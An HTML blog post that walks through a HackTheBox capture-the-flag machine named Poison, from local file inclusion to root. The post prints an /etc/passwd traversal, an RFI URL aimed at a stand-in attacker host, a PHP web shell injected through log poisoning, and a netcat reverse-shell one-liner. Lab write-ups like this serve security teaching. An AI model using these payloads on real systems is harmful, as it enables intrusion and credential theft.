@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Poison | Local File Inclusion (LFI) is a type of vulnerability usually found in poorly written PHP code. In particular, misconfigurations of some php.ini...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Poison</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2019-11-26 09:00:00+00:00">Tue 26 November 2019</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Poison.html">Poison</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Poison.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Local File Inclusion (LFI) is a type of vulnerability usually found in poorly written PHP code. In particular, misconfigurations of some php.ini values such as the allow_url directives, may allow an attacker to include a local or even remote file (Remote File Inclusion - RFI) into the webserver running the PHP code. The main difference between LFI and RFI is that the former allows an attacker to only include files already present in the webserver, whereas the latter allows an attacker to introduce his own code.</p>
+<p>To demonstrate LFI I will use a machine dubbed Poison which I found on <a href="https://www.hackthebox.eu/">hackthebox.eu</a>.</p>
+<h3 id="recons">Recons</h3>
+<p>First thing first. I did a port scan with nmap and found the following open ports:</p>
+<div class="highlight"><pre><span></span><span class="go">PORT   STATE SERVICE  VERSION</span>
+<span class="go">22/tcp open  ssh      OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)</span>
+<span class="go">|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)</span>
+<span class="go">|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)</span>
+<span class="go">80/tcp open  ssl/http Apache/2.4.29 (FreeBSD) PHP/5.6.32</span>
+<span class="go">|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32</span>
+<span class="go">|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).</span>
+<span class="go">Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd</span>
+</pre></div>
+
+
+<p>We can see that we have ssh and http ports opened. We can also see the verions of openssh and PHP, and that the OS is FreeBSD.</p>
+<p>Now it's time to scan the webserver with gobuster:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0@SittingDucks:~$</span> gobuster dir -u http://10.10.10.84 -w Documents/htb/SecLists/Discovery/Web-Content/common.txt -t <span class="m">100</span>
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.84</span>
+<span class="go">[+] Threads:        100</span>
+<span class="go">[+] Wordlist:       Documents/htb/SecLists/Discovery/Web-Content/common.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2019/11/27 06:39:57 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/.hta (Status: 403)</span>
+<span class="go">/.htaccess (Status: 403)</span>
+<span class="go">/.htpasswd (Status: 403)</span>
+<span class="go">/index.php (Status: 200)</span>
+<span class="go">/info.php (Status: 200)</span>
+<span class="go">/phpinfo.php (Status: 200)</span>
+<span class="go">===============================================================</span>
+<span class="go">2019/11/27 06:40:04 Finished</span>
+<span class="go">===============================================================</span>
+</pre></div>
+
+
+<p>We have three interesting pages we can check: index,php, info.php, phpinfo.php. The phpinfo.php page usually reports useful info. In this context, we can use it to check the value of the allow_url directives before mentioned.</p>
+<p><img alt="" src="../images/allow_url.png"></p>
+<p>From the above screenshot we can deduct that the <strong>allow_url_fopen</strong> directive is on whereas the <strong>allow_url_include</strong> is off.</p>
+<p>From the <a href="https://secure.php.net/manual/en/filesystem.configuration.php">PHP documentation</a> we can see the following description about the directives:</p>
+<p><strong>allow_url_fopen boolean</strong>
+"This option enables the URL-aware fopen wrappers that enable accessing URL object like files. Default wrappers are provided for the access of remote files using the ftp or http protocol, some extensions like zlib may register additional wrappers"</p>
+<p><strong>allow_url_include boolean</strong>
+"This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once"</p>
+<p>In these conditions the webserver will be only vulnerable to LFI (allow_url_fopen=on), whereas we won't be able to exploit an RFI since the allow_url_include is off. To give a more pratical example, let us say we have a webserver at example.com and it allows LFI, then we will have something similar:</p>
+<p><code>http://example.com/?page=index.php</code></p>
+<p>then to exploit this LFI we would need to somehow be able to put another local file instead of index.php in the URL above. We will see this later more in details. For RFI, instead, we would need to do something similar to this:</p>
+<p><code>http://example.com/?page=http://attacker.example.com/evil.php</code></p>
+<p>So we would embed a URL within another URL, but since allow_url_include is off we will be unable to do that. The latter directive has been set off by default from PHP version 5.2.0.</p>
+<p>Now, let us visit the index.php page of the webserver running in the Poison virtual machine.</p>
+<p><img alt="" src="../images/index.php.png"></p>
+<p>Ideally you would need to test all the scripts but my focus is to explain LFI so let's just try info.php. Once I insert info.php in the scritpname box I get this:</p>
+<p><img alt="" src="../images/info.php.png"></p>
+<p>Apart from the useful OS version information the other interesting bit is the URL. In fact, we are in the situation I explained above with example.com. We have:</p>
+<p><code>http://10.10.10.84/browse.php?file=info.php</code></p>
+<p>LFI usually allows for path traversal, that is it’s possible to insert a malicious string as the variable parameter to access files located outside the web publish directory.</p>
+<p><img alt="" src="../images/passwd.png"></p>
+<p>in the example above I added the string "/etc/passwd" in the variable parameter and I am able to see the content of the passwd file of the FreeBSD machine the webserver is running on. We have basically exploited LFI and obtained valuable information of the machine in question. We can do the same to enumerate other potentially useful files contained in the server. It's important to note the two users marked in red, root and charix. These are the only users that have a shell (/bin/csh) so they are the ones we can potentially use later on to try and get access.</p>
+<p>Additionally to verify that RFI doesn't work we can do he following:</p>
+<p><img alt="" src="../images/RFI.png"></p>
+<p>In fact we get an error message stating that the http wrapper is disable. I also tried other wrappes such as ftp and I got the same result.</p>
+<p>Now, if we could insert code, for instance a webshell, into a local file present in the machine?  With RFI would have been very easy to just pass the URL of where our webshell resides and that's it! In this case it's a bit trickier but not impossible, just requires few more steps. The idea is to poison (hence the machine was dubbed Poison) some log files, that is insert some code in there and then run the code. Basically transforming the LFI into an RCE (Remote Code Execution). </p>
+<p>Let us try to inject this simple php code <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
+<p>So I enable the proxy on the browser and then I open burpsuite to capture the request before it gets to the webserver. Then I paste the above php code in the user agent section in place of the string in red below:</p>
+<p><img alt="" src="../images/burp1.png"></p>
+<p>Here the pasted code:</p>
+<p><img alt="" src="../images/burp2.png"></p>
+<p>Then I send the request to the Repeater in burp and do the following:</p>
+<p><img alt="" src="../images/burp4.png"></p>
+<p>Basically the php code <code>&lt;?php system($_GET['cmd']); ?&gt;</code> instructs the system that anything coming after "cmd" is a command, so when I appended <code>&amp;cmd=id</code> to the URL the <code>id</code> command gets executed and shows the result in the logs. We have basically created an RCE which allow us to execute code in the webserver.</p>
+<p>That being said, we can try to run other more complex commands in order to get a reverse shell. In this specific scenario, this is a little bit tricky because we are dealing with a version of FreeBSD, which by default does not have bash, python, perl, etc.</p>
+<p>I have already tried a reverse shell by using netcat but looks like the version of netcat in the target machine does not support the <code>-e</code> option. So now we will try something different and we will replace the <code>id</code> command with the following string as noted on <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>:</p>
+<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code></p>
+<p><img alt="" src="../images/burp5.png"></p>
+<p>However, when I sent this request I got an "400 Bad Request" error message. Looks like the webserver did not understand the request so something wrong with the string itself. After doing some research I found out that we can send the same request URL-encoded and that would help avoiding some issues with chars set. Burp can do that by default so we just need to select the string we want to encode, then right click and choose Convert Selection --&gt; URL --&gt; URL Encode All Characters. </p>
+<p><img alt="" src="../images/burp6.png"></p>
+<p>Now before sending this request I will set a netcat listener on port 9999 on my kali machine. Once I send the request I will receive a shell back as depicted below:</p>
+<p><img alt="" src="../images/shell1.png"></p>
+<p>From the <code>whoami</code> command we can see we are the <code>www</code> user. We got a working shell but I am still unable to get an interactive tty shell most probably because the <code>www</code> user does not have a shell as we can see if the /etc/passwd screenshot above (/usr/sbin/nologin). However, let us see what we can do without a tty.</p>
+<p>NOTE: all the above steps could have been avoided. As we are in the <code>/usr/local/www/apache24/data</code> directory, we could have accessed this informatioon via browser and get this information like we did for the passwd file (exploiting LFI) without the need to get a shell. However, I wanted to show how easy it is to move from LFI to RCE. </p>
+<p>With a list command we can see some files. Particularly interesting is the <strong>pwdbackup.txt</strong>. When catting the file we can see "This password is secure, it's encoded atleat 13 times...". By the look, it seems a base64 encoding so we can try to decode it with a simple python script:</p>
+<div class="highlight"><pre><span></span><span class="go">import base64</span>
+
+<span class="go">a =&#39;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=&#39;</span>
+
+
+<span class="go">for x in xrange(13):</span>
+<span class="go">    a= base64.b64decode(a)</span>
+
+<span class="go">print(a)</span>
+</pre></div>
+
+
+<p>By running this script I obtain the string Charix!2#4%6&amp;8(0 which could be the password for the user charix we noticed before. So let's try to ssh to the box with it.</p>
+<p><img alt="" src="../images/charix-secret.png"></p>
+<p>In fact, I was able to ssh with the user charix. I also found the user.txt that contains the hash I can submit to htb to prove I owned the user. There is also another interesting file, secret.zip, which seems password protected. When trying to unzipping the file it did not prompt for a password so I tried to unzip it with the -P option and providing the password we found earlier but I got an error as noticable from the screenshot. So I downloaded the file to my kali machine and to do that I have ran a python command which starts a simple http server running on port 1111 on the victim machine. This way I can use wget on my kali box to download the file as shown in the screenshot above.</p>
+<p>Once I have the file in my box when I tried to unzip it, it asked for the password and I providing the paswword we used for the user charix worked fine and I have an encoded  <code>secret</code> file unzipped.</p>
+<p>At this stage we should find a way to escalate privileges to the root user. To do that I decided to download (using the SimpleHTTPServer method) and run a nice script called <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> in the victim machine. The script will gather a good amount of useful information for us to analyse and try to spot a weakness that leads us to root the box.</p>
+<p><img alt="" src="../images/linenum_vnc1.png"></p>
+<p>Among many other useful info, LinEnum prints out also the running processes. We can see there is a VNC process running as root which is unusual and we could potentially use it to get root access.</p>
+<p>By running a nestat to check the listening ports we can see the following:</p>
+<p><img alt="" src="../images/netstat_vnc.png"></p>
+<p>Ports 5801 and 5901 are vnc ports therefore we have confirmation that vnc is running and listening. Unfortunately we don't have a vnc client (vncviewer) in the box so we can't try to vnc locally without it. If I try to connect to it remotely I have the below result </p>
+<p><img alt="" src="../images/vnc_remote.png"></p>
+<p>but this is expected because from the netstat output we could see the vnc server is listening on the localhost (127.0.0.1). To work-around this issue we can create an ssh tunnel with the following command:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0@SittingDucks:~$</span> ssh -L <span class="m">1234</span>:127.0.0.1:5901 charix@10.10.10.84
+<span class="go">Password for charix@Poison:</span>
+<span class="go">Last login: Fri Dec  6 08:02:00 2019 from 10.10.14.46</span>
+<span class="go">FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017</span>
+
+<span class="go">Welcome to FreeBSD!</span>
+
+<span class="go">Release Notes, Errata: https://www.FreeBSD.org/releases/</span>
+<span class="go">Security Advisories:   https://www.FreeBSD.org/security/</span>
+<span class="go">FreeBSD Handbook:      https://www.FreeBSD.org/handbook/</span>
+<span class="go">FreeBSD FAQ:           https://www.FreeBSD.org/faq/</span>
+<span class="go">Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/</span>
+<span class="go">FreeBSD Forums:        https://forums.FreeBSD.org/</span>
+
+<span class="go">Documents installed with the system are in the /usr/local/share/doc/freebsd/</span>
+<span class="go">directory, or can be installed later with:  pkg install en-freebsd-doc</span>
+<span class="go">For other languages, replace &quot;en&quot; with a language code like de or fr.</span>
+
+<span class="go">Show the version of FreeBSD installed:  freebsd-version ; uname -a</span>
+<span class="go">Please include that output and any error messages when posting questions.</span>
+<span class="go">Introduction to manual pages:  man man</span>
+<span class="go">FreeBSD directory layout:      man hier</span>
+
+<span class="go">Edit /etc/motd to change this login announcement.</span>
+<span class="go">You can use the &#39;fetch&#39; command to retrieve files over ftp, http or https.</span>
+
+<span class="go">         fetch http://www.FreeBSD.org/index.html</span>
+
+<span class="go">will download the front page of the FreeBSD web site.</span>
+</pre></div>
+
+
+<p>We can see in my kali box that the we have a listening connection on the localhost at port 1234. So we can then connect to that socket using vncviewer:</p>
+<p><img alt="" src="../images/root.png"></p>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Poison.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Poison"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
